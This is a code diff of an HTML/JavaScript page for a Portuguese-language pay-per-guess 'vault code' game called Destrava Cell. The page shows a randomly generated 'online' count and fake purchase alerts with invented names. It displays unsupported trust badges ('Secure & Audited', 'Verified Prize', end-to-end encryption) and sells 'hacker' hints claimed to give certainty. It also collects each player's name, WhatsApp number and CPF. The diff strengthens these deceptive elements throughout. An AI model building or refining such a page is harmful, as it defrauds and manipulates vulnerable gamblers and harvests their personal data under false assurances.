@@ -3,11 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OpenPix | Destrava Cell</title>
+    <title>OpenPix | Destrava Cell - Plataforma Segura</title>
     
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
     
     <style>
         body {
@@ -16,6 +17,7 @@
             background-position: center;
             background-repeat: no-repeat; 
             background-attachment: fixed;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         /* Vidro (Glassmorphism) */
@@ -24,7 +26,7 @@
             backdrop-filter: blur(20px); 
             -webkit-backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 0 50px rgba(0, 0, 0, 0.9);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
         }
 
         .input-display {
@@ -58,7 +60,7 @@
         @keyframes typing { from { width: 0 } to { width: 100% } }
         
         /* Animações Gerais */
-        .modal-backdrop { background-color: rgba(0, 0, 0, 0.9); backdrop-filter: blur(10px); }
+        .modal-backdrop { background-color: rgba(0, 0, 0, 0.9); backdrop-filter: blur(8px); }
         .shake { animation: shake 0.5s; }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-8px); } 40%, 80% { transform: translateX(8px); } }
         @keyframes shimmer { 0% { left: -100%; } 100% { left: 200%; } }
@@ -76,150 +78,205 @@
         }
     </style>
 </head>
-<body class="text-white flex flex-col items-center justify-center min-h-screen p-4 overflow-hidden relative">
+<body class="text-white flex flex-col items-center justify-between min-h-screen overflow-x-hidden relative pb-10">
 
-    <div class="fixed inset-0 bg-black/70 z-[-1]"></div>
+    <div class="fixed inset-0 bg-black/80 z-[-1]"></div>
 
     <audio id="sfx-type" src="type.mp3"></audio>
     <audio id="sfx-error" src="error.mp3"></audio>
     <audio id="sfx-win" src="win.mp3"></audio>
-    <audio id="sfx-pop" src="https://assets.mixkit.co/sfx/preview/mixkit-software-interface-start-2574.mp3"></audio> <div class="absolute top-4 left-4 z-50 flex items-center gap-2 bg-black/40 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/10">
-        <span class="relative flex h-2 w-2">
-          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
-          <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
-        </span>
-        <span class="text-[10px] font-mono text-green-400 font-bold tracking-wider">
-            <span id="contador-online">142</span> ONLINE
-        </span>
-    </div>
+    <audio id="sfx-pop" src="https://assets.mixkit.co/sfx/preview/mixkit-software-interface-start-2574.mp3"></audio>
 
-    <div id="notificacao-live" class="fixed top-6 z-[100] live-notification flex items-center gap-3 bg-slate-800/90 backdrop-blur-md border-l-4 border-yellow-500 text-white px-4 py-3 rounded shadow-2xl max-w-[90%] sm:max-w-xs">
-        <div class="bg-yellow-500/20 p-1.5 rounded-full">
-            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-yellow-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
-            </svg>
+    <div class="w-full max-w-md flex justify-between items-center px-4 py-4 z-50">
+        <div class="flex items-center gap-2 bg-black/40 backdrop-blur-md px-3 py-1.5 rounded-full border border-white/10 shadow-lg">
+            <span class="relative flex h-2 w-2">
+              <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+              <span class="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
+            </span>
+            <span class="text-[10px] font-mono text-green-400 font-bold tracking-wider">
+                <span id="contador-online">142</span> ONLINE
+            </span>
         </div>
-        <div class="text-xs">
-            <p class="font-bold text-yellow-400" id="notificacao-titulo">Alerta!</p>
-            <p class="text-slate-300" id="notificacao-msg">...</p>
-        </div>
-    </div>
 
-    <div class="absolute top-4 right-4 z-50">
-        <button onclick="abrirHistorico()" class="bg-white/5 hover:bg-white/10 border border-white/10 text-[10px] px-4 py-2 rounded-full transition-all flex items-center gap-2 hover:scale-105 active:scale-95">
-            📂 MEUS PALPITES
+        <button onclick="abrirHistorico()" class="bg-white/5 hover:bg-white/10 border border-white/10 text-[10px] px-4 py-2 rounded-full transition-all flex items-center gap-2 shadow-lg">
+            <i class="fas fa-history text-yellow-500"></i> PALPITES
         </button>
     </div>
 
-    <main class="glass-panel p-8 rounded-[2.5rem] w-full max-w-md text-center relative border-t border-white/20">
-        <header class="mb-8">
-            <h1 class="text-5xl font-black tracking-tighter italic">
-                <span class="text-yellow-500">OPEN</span>PIX
+    <div id="notificacao-live" class="fixed top-16 z-[100] live-notification flex items-center gap-3 bg-slate-800/95 backdrop-blur-md border-l-4 border-yellow-500 text-white px-4 py-3 rounded shadow-2xl max-w-[90%] sm:max-w-xs mx-auto inset-x-0 sm:mx-0 sm:right-4 sm:left-auto">
+        <div class="bg-yellow-500/20 p-2 rounded-full">
+            <i class="fas fa-bell text-yellow-400 text-xs"></i>
+        </div>
+        <div class="text-xs">
+            <p class="font-bold text-yellow-400" id="notificacao-titulo">Alerta!</p>
+            <p class="text-slate-300 leading-tight" id="notificacao-msg">...</p>
+        </div>
+    </div>
+
+    <main class="glass-panel p-8 rounded-[2rem] w-[95%] max-w-md text-center relative border-t border-white/20 mt-4 mb-8">
+        <header class="mb-6">
+            <h1 class="text-4xl sm:text-5xl font-black tracking-tighter italic">
+                <span class="text-yellow-500">DESTRAVA</span><span class="text-white">CELL</span>
             </h1>
-            <p class="text-slate-500 text-[10px] font-bold tracking-[0.4em] uppercase">Security Protocol Active</p>
+            <div class="flex justify-center items-center gap-2 mt-2">
+                <i class="fas fa-lock text-[10px] text-green-500"></i>
+                <p class="text-slate-500 text-[9px] font-bold tracking-[0.2em] uppercase">Ambiente Seguro & Auditado</p>
+            </div>
         </header>
 
-        <div class="mb-10 relative group">
-            <div class="absolute -inset-1 bg-green-500/20 blur-xl rounded-full opacity-50 group-hover:opacity-75 transition duration-500"></div>
-            <span class="relative text-[10px] uppercase tracking-widest text-slate-400 font-bold bg-black/50 px-4 py-1 rounded-full border border-slate-800">Prêmio Acumulado</span>
-            <div class="relative text-6xl font-mono font-black text-green-400 mt-4 tracking-tighter" style="text-shadow: 0 0 20px rgba(74, 222, 128, 0.4);">
+        <div class="mb-8 relative group">
+            <div class="absolute -inset-1 bg-green-500/10 blur-xl rounded-full opacity-50 group-hover:opacity-75 transition duration-500"></div>
+            <div class="inline-flex items-center gap-2 bg-black/60 px-4 py-1 rounded-full border border-slate-700 mb-2">
+                <i class="fas fa-shield-alt text-green-400 text-[10px]"></i>
+                <span class="text-[9px] uppercase tracking-widest text-slate-300 font-bold">Prêmio Verificado</span>
+            </div>
+            <div class="relative text-6xl font-mono font-black text-green-400 tracking-tighter drop-shadow-[0_0_10px_rgba(74,222,128,0.3)]">
                 R$ <span id="premio">500,30</span>
             </div>
         </div>
 
-        <div class="input-display p-5 rounded-2xl mb-6">
-            <input type="password" id="senha" maxlength="4" placeholder="----" class="bg-transparent text-center text-6xl font-mono font-bold tracking-[1.2rem] outline-none w-full text-white placeholder-slate-900 focus:placeholder-transparent transition-all">
+        <div class="input-display p-4 rounded-xl mb-6 relative">
+            <div class="absolute top-2 left-3">
+                <i class="fas fa-key text-slate-700 text-xs"></i>
+            </div>
+            <input type="password" id="senha" maxlength="4" placeholder="••••" class="bg-transparent text-center text-5xl font-mono font-bold tracking-[1rem] outline-none w-full text-white placeholder-slate-800 focus:placeholder-transparent transition-all h-16">
         </div>
 
         <div id="terminal" class="terminal-log rounded-xl mb-6 hidden opacity-0 transition-opacity duration-300"></div>
 
-        <button id="btn-acao" onclick="verificarLogin()" class="w-full bg-gradient-to-b from-yellow-400 to-yellow-600 text-black font-black text-2xl py-5 rounded-2xl transition-all active:scale-95 border-b-4 border-yellow-800 relative overflow-hidden group hover:shadow-[0_0_30px_rgba(234,179,8,0.4)]">
-            <div class="absolute top-0 -left-full w-full h-full bg-gradient-to-r from-transparent via-white/50 to-transparent skew-x-[-20deg] group-hover:animate-[shimmer_1.5s_infinite]"></div>
-            <span id="btn-texto">ABRIR AGORA</span>
+        <button id="btn-acao" onclick="verificarLogin()" class="w-full bg-gradient-to-b from-yellow-400 to-yellow-600 text-black font-black text-xl py-4 rounded-xl transition-all active:scale-95 border-b-4 border-yellow-800 relative overflow-hidden group hover:shadow-[0_0_20px_rgba(234,179,8,0.3)] flex justify-center items-center gap-3">
+            <div class="absolute top-0 -left-full w-full h-full bg-gradient-to-r from-transparent via-white/40 to-transparent skew-x-[-20deg] group-hover:animate-[shimmer_1.5s_infinite]"></div>
+            <i class="fas fa-unlock-alt"></i> <span id="btn-texto">ABRIR COFRE AGORA</span>
         </button>
 
-        <button onclick="abrirDicas()" class="mt-8 text-yellow-400 hover:text-yellow-300 text-sm font-black tracking-[0.2em] transition-all uppercase animate-pulse hack-button border-b-2 border-transparent hover:border-yellow-400 pb-1 flex items-center justify-center gap-2 mx-auto">
-            <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
-            HACKEAR O SISTEMA
+        <button onclick="abrirDicas()" class="mt-6 text-yellow-500 hover:text-white text-xs font-black tracking-[0.1em] transition-all uppercase animate-pulse hack-button border border-yellow-500/30 hover:bg-yellow-500/10 hover:border-yellow-500 rounded-lg px-4 py-2 flex items-center justify-center gap-2 mx-auto w-full max-w-[80%]">
+            <i class="fas fa-user-secret"></i> HACKEAR SISTEMA DE SEGURANÇA
         </button>
+
+        <div class="mt-6 flex justify-center gap-4 text-[9px] text-slate-500 uppercase tracking-wide border-t border-white/5 pt-4">
+            <div class="flex items-center gap-1"><i class="fas fa-lock"></i> SSL SEGURO</div>
+            <div class="flex items-center gap-1"><i class="fab fa-pix"></i> PAGAMENTO INSTANTÂNEO</div>
+        </div>
     </main>
+
+    <footer class="text-center w-full max-w-md px-4 mt-4 opacity-70">
+        <div class="flex justify-center gap-4 mb-4 text-2xl text-slate-600">
+            <i class="fab fa-cc-visa" title="Visa"></i>
+            <i class="fab fa-cc-mastercard" title="Mastercard"></i>
+            <i class="fas fa-qrcode" title="PIX"></i>
+            <i class="fas fa-shield-virus" title="Site Seguro"></i>
+        </div>
+        <p class="text-[10px] text-slate-600">
+            © 2026 Destrava Cell Entretenimento Digital.<br>
+            Todos os direitos reservados. CNPJ: 45.281.***/***1-00<br>
+            <span class="text-slate-500">Termos de Uso • Privacidade • Jogo Responsável (+18)</span>
+        </p>
+        <div class="mt-2 text-[8px] text-slate-700">
+            Esta plataforma utiliza criptografia de ponta a ponta.
+        </div>
+    </footer>
+
+    <a href="https://wa.me/5569999083361?text=Ol%C3%A1%2C%20preciso%20de%20ajuda%20no%20jogo%20do%20cofre!" target="_blank" class="fixed bottom-6 right-6 bg-green-500 hover:bg-green-400 text-white rounded-full p-4 shadow-2xl transition-transform hover:scale-110 z-50 flex items-center justify-center">
+        <i class="fab fa-whatsapp text-3xl"></i>
+    </a>
 
     <div id="modal-cadastro" class="fixed inset-0 modal-backdrop z-[60] hidden flex items-center justify-center p-4">
         <div class="bg-slate-900 border border-slate-700 p-8 rounded-3xl w-full max-w-sm shadow-2xl relative">
-            <h3 class="text-2xl font-black text-yellow-500 mb-2 italic">IDENTIFICAÇÃO</h3>
-            <p class="text-slate-400 text-xs mb-8">Cadastre-se para receber o PIX caso ganhe.</p>
+            <h3 class="text-xl font-black text-white mb-2 uppercase flex items-center gap-2">
+                <i class="fas fa-id-card text-yellow-500"></i> Identificação
+            </h3>
+            <p class="text-slate-400 text-xs mb-6">Seus dados estão protegidos pela LGPD. Cadastre-se para validar o prêmio.</p>
             <form onsubmit="salvarCadastro(event)" class="space-y-4">
-                <input type="text" id="input-nome" placeholder="Nome Completo" required class="w-full bg-black border border-slate-700 rounded-xl p-4 text-white outline-none focus:border-yellow-500">
-                <input type="tel" id="input-tel" placeholder="WhatsApp" required class="w-full bg-black border border-slate-700 rounded-xl p-4 text-white outline-none focus:border-yellow-500">
-                <input type="text" id="input-cpf" placeholder="CPF (Chave Pix)" required class="w-full bg-black border border-slate-700 rounded-xl p-4 text-white outline-none focus:border-yellow-500">
-                <button class="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-4 rounded-xl transition-all uppercase tracking-widest shadow-lg shadow-green-600/20">SALVAR E CONTINUAR</button>
+                <div class="relative">
+                    <i class="fas fa-user absolute left-4 top-4 text-slate-500 text-xs"></i>
+                    <input type="text" id="input-nome" placeholder="Nome Completo" required class="w-full bg-black border border-slate-700 rounded-xl p-3 pl-10 text-white text-sm outline-none focus:border-yellow-500">
+                </div>
+                <div class="relative">
+                    <i class="fab fa-whatsapp absolute left-4 top-4 text-slate-500 text-xs"></i>
+                    <input type="tel" id="input-tel" placeholder="WhatsApp" required class="w-full bg-black border border-slate-700 rounded-xl p-3 pl-10 text-white text-sm outline-none focus:border-yellow-500">
+                </div>
+                <div class="relative">
+                    <i class="fas fa-fingerprint absolute left-4 top-4 text-slate-500 text-xs"></i>
+                    <input type="text" id="input-cpf" placeholder="CPF (Chave Pix)" required class="w-full bg-black border border-slate-700 rounded-xl p-3 pl-10 text-white text-sm outline-none focus:border-yellow-500">
+                </div>
+                <button class="w-full bg-green-600 hover:bg-green-500 text-white font-bold py-3 rounded-xl transition-all uppercase tracking-widest shadow-lg text-sm mt-2">
+                    <i class="fas fa-check-circle mr-2"></i> Confirmar Cadastro
+                </button>
             </form>
+            <p class="text-[9px] text-center text-slate-600 mt-4"><i class="fas fa-lock"></i> Seus dados nunca serão compartilhados.</p>
         </div>
     </div>
 
     <div id="modal-planos" class="fixed inset-0 modal-backdrop z-[70] hidden flex items-center justify-center p-4">
         <div class="bg-slate-900 border border-slate-700 p-6 rounded-[2rem] w-full max-w-sm shadow-2xl relative">
-            <button onclick="fecharModal('modal-planos')" class="absolute top-4 right-4 text-slate-500 hover:text-white">✕</button>
-            <div class="text-center mb-8">
-                <h3 class="text-2xl font-black text-white italic">SALDO INSUFICIENTE</h3>
-                <p class="text-slate-500 text-[10px] uppercase tracking-widest">Adquira tentativas para jogar</p>
+            <button onclick="fecharModal('modal-planos')" class="absolute top-4 right-4 text-slate-500 hover:text-white"><i class="fas fa-times"></i></button>
+            <div class="text-center mb-6">
+                <div class="inline-block bg-red-500/20 p-3 rounded-full mb-3">
+                    <i class="fas fa-exclamation-triangle text-red-500 text-xl"></i>
+                </div>
+                <h3 class="text-xl font-black text-white">TENTATIVAS ESGOTADAS</h3>
+                <p class="text-slate-400 text-[10px] uppercase tracking-widest mt-1">Adquira um pacote para continuar</p>
             </div>
             <div class="space-y-3">
-                <div onclick="selecionarPlano(1.00, 1, '1 Tentativa')" class="bg-slate-800 p-4 rounded-2xl flex justify-between items-center border border-slate-700 cursor-pointer hover:bg-slate-700 transition">
-                    <span class="font-bold text-sm">1 TENTATIVA</span>
+                <div onclick="selecionarPlano(1.00, 1, '1 Tentativa')" class="bg-slate-800 p-4 rounded-xl flex justify-between items-center border border-slate-700 cursor-pointer hover:bg-slate-700 transition group">
+                    <span class="font-bold text-sm text-slate-300 group-hover:text-white">1 TENTATIVA</span>
                     <span class="text-yellow-500 font-black">R$ 1,00</span>
                 </div>
-                <div onclick="selecionarPlano(5.00, 7, '7 Tentativas')" class="bg-slate-800 p-4 rounded-2xl flex justify-between items-center border-2 border-yellow-500 cursor-pointer relative hover:bg-slate-700 transition">
-                    <div class="absolute -top-2 right-4 bg-yellow-500 text-black text-[8px] font-black px-2 py-0.5 rounded italic shadow-lg">MAIS VENDIDO</div>
-                    <span class="font-bold text-sm">7 TENTATIVAS</span>
+                <div onclick="selecionarPlano(5.00, 7, '7 Tentativas')" class="bg-gradient-to-r from-slate-800 to-slate-800 hover:to-slate-700 p-4 rounded-xl flex justify-between items-center border border-yellow-500/50 cursor-pointer relative transition shadow-lg shadow-yellow-500/5">
+                    <div class="absolute -top-2 right-4 bg-yellow-500 text-black text-[8px] font-black px-2 py-0.5 rounded italic shadow-md">POPULAR</div>
+                    <span class="font-bold text-sm text-white">7 TENTATIVAS</span>
                     <span class="text-yellow-500 font-black">R$ 5,00</span>
                 </div>
-                <div onclick="selecionarPlano(10.00, 20, '20 Tentativas')" class="bg-slate-800 p-4 rounded-2xl flex justify-between items-center border border-slate-700 cursor-pointer hover:bg-slate-700 transition">
-                    <span class="font-bold text-sm">20 TENTATIVAS</span>
+                <div onclick="selecionarPlano(10.00, 20, '20 Tentativas')" class="bg-slate-800 p-4 rounded-xl flex justify-between items-center border border-slate-700 cursor-pointer hover:bg-slate-700 transition group">
+                    <span class="font-bold text-sm text-slate-300 group-hover:text-white">20 TENTATIVAS</span>
                     <span class="text-yellow-500 font-black">R$ 10,00</span>
                 </div>
             </div>
-            <p class="text-center text-[9px] text-slate-600 mt-6">Ambiente Seguro. Liberação Imediata.</p>
+            <div class="flex items-center justify-center gap-2 mt-6 text-[9px] text-green-500 font-bold opacity-80">
+                <i class="fas fa-bolt"></i> Liberação Imediata via PIX
+            </div>
         </div>
     </div>
 
     <div id="modal-dicas" class="fixed inset-0 modal-backdrop z-[80] hidden flex items-center justify-center p-4">
         <div class="bg-slate-900 border border-yellow-500/50 p-6 rounded-[2rem] w-full max-w-sm shadow-2xl relative">
-            <button onclick="fecharModal('modal-dicas')" class="absolute top-4 right-4 text-slate-500 hover:text-white">✕</button>
+            <button onclick="fecharModal('modal-dicas')" class="absolute top-4 right-4 text-slate-500 hover:text-white"><i class="fas fa-times"></i></button>
             <div class="text-center mb-6">
-                <h3 class="text-2xl font-black text-yellow-500 italic uppercase">HACK DO SISTEMA</h3>
-                <p class="text-slate-400 text-[10px]">Valores ajustados conforme o prêmio</p>
+                <i class="fas fa-user-secret text-yellow-500 text-3xl mb-2"></i>
+                <h3 class="text-xl font-black text-white italic uppercase">MENU HACKER</h3>
+                <p class="text-slate-400 text-[10px]">Ferramentas de intrusão avançada</p>
             </div>
             <div class="space-y-3">
                 <div id="btn-dica-1" class="bg-slate-800 p-4 rounded-xl flex justify-between items-center border border-slate-700 cursor-pointer hover:bg-slate-700/80 transition-all group">
                     <div>
-                        <div class="text-sm font-bold group-hover:text-yellow-400 transition">REVELAR 1º NÚMERO</div>
-                        <div class="text-[9px] text-slate-500">Aumenta chance em 10%</div>
+                        <div class="text-sm font-bold text-slate-200 group-hover:text-yellow-400 transition">REVELAR 1º NÚMERO</div>
+                        <div class="text-[9px] text-slate-500">Certeza de 10%</div>
                     </div>
                     <span id="val-dica-1" class="text-green-400 font-black text-sm">--</span>
                 </div>
                 <div id="btn-dica-2" class="bg-slate-800 p-4 rounded-xl flex justify-between items-center border border-slate-700 cursor-pointer hover:bg-slate-700/80 transition-all group">
                     <div>
-                        <div class="text-sm font-bold group-hover:text-yellow-400 transition">REVELAR 2 NÚMEROS</div>
-                        <div class="text-[9px] text-slate-500">Aumenta chance em 50%</div>
+                        <div class="text-sm font-bold text-slate-200 group-hover:text-yellow-400 transition">REVELAR 2 NÚMEROS</div>
+                        <div class="text-[9px] text-slate-500">Certeza de 50%</div>
                     </div>
                     <span id="val-dica-2" class="text-green-400 font-black text-sm">--</span>
                 </div>
                 <div id="btn-dica-3" class="bg-slate-800 p-4 rounded-xl flex justify-between items-center border border-yellow-500/30 cursor-pointer hover:bg-slate-700/80 transition-all group">
                     <div>
                         <div class="text-sm font-bold text-yellow-500">REVELAR 3 NÚMEROS</div>
-                        <div class="text-[9px] text-yellow-500/70">VITÓRIA QUASE CERTA</div>
+                        <div class="text-[9px] text-yellow-500/70">PRÊMIO QUASE GARANTIDO</div>
                     </div>
                     <span id="val-dica-3" class="text-yellow-400 font-black text-sm">--</span>
                 </div>
             </div>
+            <p class="text-center text-[9px] text-slate-600 mt-4">Valores calculados com base no pote atual.</p>
         </div>
     </div>
 
     <div id="modal-historico" class="fixed inset-0 modal-backdrop z-[60] hidden flex items-center justify-center p-4">
         <div class="bg-slate-900 border border-slate-700 p-6 rounded-3xl w-full max-w-sm h-[400px] flex flex-col shadow-2xl relative">
-            <button onclick="fecharModal('modal-historico')" class="absolute top-4 right-4 text-slate-500 hover:text-white">✕</button>
-            <h3 class="text-xl font-black mb-4 flex items-center gap-2"><span class="text-yellow-500">📂</span> LOGS DE ACESSO</h3>
+            <button onclick="fecharModal('modal-historico')" class="absolute top-4 right-4 text-slate-500 hover:text-white"><i class="fas fa-times"></i></button>
+            <h3 class="text-xl font-black mb-4 flex items-center gap-2 text-white"><i class="fas fa-history text-yellow-500"></i> SEUS REGISTROS</h3>
             <div id="lista-historico" class="flex-1 overflow-y-auto space-y-2 pr-2 custom-scrollbar"></div>
         </div>
     </div>
@@ -232,15 +289,10 @@
             win: document.getElementById('sfx-win'),
             pop: document.getElementById('sfx-pop')
         };
-        
-        // Volume baixo para não assustar
-        sfx.pop.volume = 0.5;
+        sfx.pop.volume = 0.4;
 
         function play(sound) {
-            if (sound) {
-                sound.currentTime = 0;
-                sound.play().catch(() => {}); // Ignora erro se usuário não interagiu
-            }
+            if (sound) { sound.currentTime = 0; sound.play().catch(() => {}); }
         }
 
         // --- MÁSCARAS ---
@@ -249,7 +301,7 @@
             $('#input-cpf').mask('000.000.000-00');
         });
 
-        // --- DADOS DO USUÁRIO ---
+        // --- DADOS ---
         let usuario = JSON.parse(localStorage.getItem('openpix_user')) || null;
         let historico = JSON.parse(localStorage.getItem('openpix_history')) || [];
 
@@ -257,13 +309,12 @@
         function fecharModal(id) { document.getElementById(id).classList.add('hidden'); }
         
         function abrirDicas() {
-            // Lógica de Preço Dinâmico
             let textoPremio = $('#premio').text().replace('.', '').replace(',', '.');
             let valorPremio = parseFloat(textoPremio);
 
-            let p1 = valorPremio * 0.05; // 5%
-            let p2 = valorPremio * 0.15; // 15%
-            let p3 = valorPremio * 0.50; // 50%
+            let p1 = valorPremio * 0.05; 
+            let p2 = valorPremio * 0.15; 
+            let p3 = valorPremio * 0.50; 
 
             $('#val-dica-1').text('R$ ' + p1.toLocaleString('pt-BR', {minimumFractionDigits: 2}));
             $('#val-dica-2').text('R$ ' + p2.toLocaleString('pt-BR', {minimumFractionDigits: 2}));
@@ -295,19 +346,17 @@
 
             fecharModal('modal-cadastro');
             
-            // Voz de Boas-vindas
             if ('speechSynthesis' in window) {
-                const speech = new SpeechSynthesisUtterance(`Acesso autorizado, ${usuario.nome.split(' ')[0]}. Boa sorte.`);
+                const speech = new SpeechSynthesisUtterance(`Cadastro confirmado. Bem vindo ao Destrava Cell.`);
                 speech.lang = 'pt-BR';
                 window.speechSynthesis.speak(speech);
             }
-            
             document.getElementById('modal-planos').classList.remove('hidden');
         }
 
         function selecionarPlano(valor, chances, plano) {
             fecharModal('modal-planos');
-            $('#btn-texto').text('PROCESSANDO PIX...');
+            $('#btn-texto').html('<i class="fas fa-circle-notch fa-spin"></i> GERANDO PIX...');
             
             setTimeout(() => {
                 fetch('/registrar-venda', { 
@@ -321,7 +370,7 @@
 
         async function comprarDica(nivel, valor, plano) {
             fecharModal('modal-dicas');
-            if(confirm(`Confirmar pagamento de R$ ${valor} para hackear o Nível ${nivel}?`)) {
+            if(confirm(`Confirmar investimento de R$ ${valor} para desbloquear o Nível ${nivel}?`)) {
                 const res = await fetch('/comprar-dica', { 
                     method: 'POST', 
                     headers: {'Content-Type': 'application/json'}, 
@@ -330,16 +379,16 @@
                 const data = await res.json();
                 
                 $('#terminal').removeClass('hidden').css('opacity', '1').empty();
-                log(`INTRUSÃO KERNEL NÍVEL ${nivel}...`, "#eab308");
+                log(`INJETANDO SCRIPT NÍVEL ${nivel}...`, "#eab308");
                 await new Promise(r => setTimeout(r, 800));
-                log(`DADOS EXTRAÍDOS: [ ${data.dica} ]`, "#fff");
+                log(`ACESSO PARCIAL: [ ${data.dica} ]`, "#fff");
             }
         }
 
-        // --- SISTEMA DE LOGS E JOGO ---
+        // --- LÓGICA DO JOGO ---
         async function log(m, c = "#4ade80") {
             play(sfx.type);
-            const line = $(`<div class="log-line" style="color:${c}">> ${m}</div>`);
+            const line = $(`<div class="log-line" style="color:${c}"><i class="fas fa-angle-right"></i> ${m}</div>`);
             $('#terminal').append(line);
             $('#terminal').scrollTop($('#terminal')[0].scrollHeight);
         }
@@ -349,11 +398,11 @@
             $('#btn-acao').prop('disabled', true);
             $('#terminal').removeClass('hidden').css('opacity', '1').empty();
             
-            await log(`Autenticando CPF: ${usuario.cpf}...`);
+            await log(`Validando credenciais...`);
             await new Promise(r => setTimeout(r, 600));
-            await log("Buscando hash no banco de dados...");
+            await log("Conectando ao cofre digital...");
             await new Promise(r => setTimeout(r, 800));
-            await log(`Testando combinação: ${senhaTentativa}`);
+            await log(`Testando chave: [ ${senhaTentativa} ]`);
             await new Promise(r => setTimeout(r, 1000));
 
             const res = await fetch('/tentar', { 
@@ -363,23 +412,19 @@
             });
             const data = await res.json();
 
-            historico.push({ 
-                senha: senhaTentativa, 
-                ganhou: data.ganhou, 
-                data: new Date().toLocaleString('pt-BR') 
-            });
+            historico.push({ senha: senhaTentativa, ganhou: data.ganhou, data: new Date().toLocaleString('pt-BR') });
             localStorage.setItem('openpix_history', JSON.stringify(historico));
 
             if (data.ganhou) {
                 play(sfx.win);
-                await log("ACESSO CONCEDIDO! TRANSFERINDO...", "#fbbf24");
+                await log("ACESSO AUTORIZADO! SAQUE LIBERADO.", "#fbbf24");
                 setTimeout(() => { 
-                    alert(`💰 TRANSFEÊNCIA REALIZADA!\nValor: R$ ${data.premio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}\nVerifique sua conta.`); 
+                    alert(`✅ PARABÉNS!\nVocê desbloqueou R$ ${data.premio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}.\nO valor será enviado para o CPF cadastrado.`); 
                     location.reload(); 
                 }, 1000);
             } else {
                 play(sfx.error);
-                await log("ERRO: SENHA INCORRETA.", "#ef4444");
+                await log("ERRO: ACESSO NEGADO.", "#ef4444");
                 $('body').addClass('shake');
                 
                 setTimeout(() => {
@@ -387,7 +432,7 @@
                     $('#terminal').css('opacity', '0').addClass('hidden');
                     $('#senha').val('').prop('disabled', false).focus();
                     $('#btn-acao').prop('disabled', false);
-                    $('#btn-texto').text('TENTAR NOVAMENTE');
+                    $('#btn-texto').html('<i class="fas fa-unlock-alt"></i> ABRIR COFRE AGORA'); // Restaura o ícone e texto
                     $('#premio').text(data.novoPremio.toLocaleString('pt-BR', { minimumFractionDigits: 2 }));
                 }, 1500);
             }
@@ -396,14 +441,14 @@
         function abrirHistorico() {
             const lista = $('#lista-historico').empty();
             if (!historico.length) {
-                lista.html('<p class="text-center text-slate-600 mt-10 text-xs">Nenhum palpite registrado.</p>');
+                lista.html('<p class="text-center text-slate-600 mt-10 text-xs">Seu histórico está vazio.</p>');
             } else {
                 historico.slice().reverse().forEach(h => {
                     lista.append(`
-                        <div class="bg-black/40 p-3 rounded-lg border border-slate-700 flex justify-between items-center hover:bg-black/60 transition">
+                        <div class="bg-black/40 p-3 rounded-lg border border-slate-700 flex justify-between items-center hover:bg-black/60 transition mb-2">
                             <span class="font-mono text-lg text-white tracking-widest">${h.senha}</span>
-                            <span class="text-[10px] font-bold px-2 py-1 rounded ${h.ganhou ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}">
-                                ${h.ganhou ? 'ABERTO' : 'FALHA'}
+                            <span class="text-[9px] font-bold px-2 py-1 rounded ${h.ganhou ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}">
+                                ${h.ganhou ? 'DESBLOQUEADO' : 'BLOQUEADO'}
                             </span>
                         </div>
                     `);
@@ -412,63 +457,44 @@
             document.getElementById('modal-historico').classList.remove('hidden');
         }
 
-        // ==========================================
-        // SISTEMA DE GATILHOS MENTAIS (CORRIGIDO)
-        // ==========================================
-        
-        // 1. Contador de Online
+        // --- SISTEMA DE NOTIFICAÇÕES (COMPETIÇÃO) ---
         const contadorEl = document.getElementById('contador-online');
         setInterval(() => {
             let atual = parseInt(contadorEl.innerText);
-            let variacao = Math.floor(Math.random() * 5) - 2; // -2 a +2
+            let variacao = Math.floor(Math.random() * 5) - 2; 
             let novo = atual + variacao;
-            if (novo < 80) novo = 80; // Mínimo
-            if (novo > 350) novo = 350; // Máximo
+            if (novo < 80) novo = 80;
+            if (novo > 350) novo = 350;
             contadorEl.innerText = novo;
         }, 3000);
 
-        // 2. Notificações de COMPETIÇÃO (Investimento/Tentativa)
-        const nomes = ["Pedro", "Ana", "Lucas", "Marcos", "Júlia", "Rafael", "Carla", "Bruno", "Felipe", "Mariana", "João", "Gustavo", "Larissa", "Thiago", "Camila"];
+        const nomes = ["Ricardo", "Beatriz", "Fernando", "Juliana", "Roberto", "Camila", "André", "Vanessa", "Diego", "Larissa", "Tiago", "Patrícia"];
         const acoes = [
-            // Focados em GASTAR/INVESTIR (justifica o prêmio aumentar)
             { titulo: "Nova Compra!", msg: "acabou de comprar 20 tentativas", cor: "text-green-400" },
-            { titulo: "Atenção!", msg: "comprou uma Pista Nível 1", cor: "text-yellow-400" },
